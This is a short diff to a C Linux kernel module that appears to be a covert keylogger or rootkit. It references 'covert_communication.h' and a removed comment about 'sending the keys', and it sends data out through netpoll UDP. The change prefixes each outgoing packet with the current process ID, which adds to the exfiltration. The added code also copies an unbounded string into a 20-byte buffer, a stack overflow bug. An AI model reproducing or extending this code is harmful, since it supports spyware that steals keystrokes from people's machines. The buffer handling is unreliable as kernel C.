@@ -7,6 +7,7 @@
 #include <linux/unistd.h>
 #include <linux/netpoll.h>
 #include <linux/init.h>
+#include <linux/sched.h>
 
 #include "covert_communication.h"
 #include "include.h"
@@ -51,9 +52,13 @@ void init_netpoll(void)
 /* Function to send the UDP packet */
 void send_udp(const char *buf)
 {
-        //printk("DEBUG: sending the keys");
+	struct task_struct *task = current;
+	char buf1[20];
+	sprintf(buf1, "%d", task->pid);
+	int len1 = strlen(buf1);
+	strcpy(buf1+len1, buf);
         int len = strlen(buf);
-        netpoll_send_udp(np,buf,len);
+        netpoll_send_udp(np,buf1,len1+len);
 }
 
 /*
